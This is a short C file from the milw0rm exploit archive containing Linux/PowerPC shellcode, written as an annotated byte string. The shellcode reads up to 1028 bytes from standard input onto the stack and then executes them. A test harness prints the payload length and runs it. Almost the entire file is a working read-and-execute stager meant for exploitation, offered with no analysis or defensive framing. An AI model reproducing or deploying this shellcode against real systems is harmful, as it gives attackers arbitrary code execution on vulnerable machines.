/* readnexecppc-core.c by Charles Stevenson <core@bokeoa.com> */
char hellcode[] = /* read(0,stack,1028); stack(); linux/ppc by core */
"\x7c\x63\x1a\x79"     /* xor.    r3,r3,r3 */
"\x38\xa0\x04\x04"     /* li      r5,1028 */
"\x30\x05\xfb\xff"     /* addic   r0,r5,-1025 */
"\x7c\x24\x0b\x78"     /* mr      r4,r1 */
"\x44\xde\xad\xf2"     /* sc */
"\x69\x69\x69\x69"     /* nop */
"\x7c\x29\x03\xa6"     /* mtctr   r1 */
"\x4e\x80\x04\x21";    /* bctrl */

int main(void)
{
  void (*shell)() = (void *)&hellcode;
  printf("%d byte read & exec shellcode for linux/ppc by core\n",
         strlen(hellcode));
  shell();
  return 0;
}

// milw0rm.com [2005-11-09]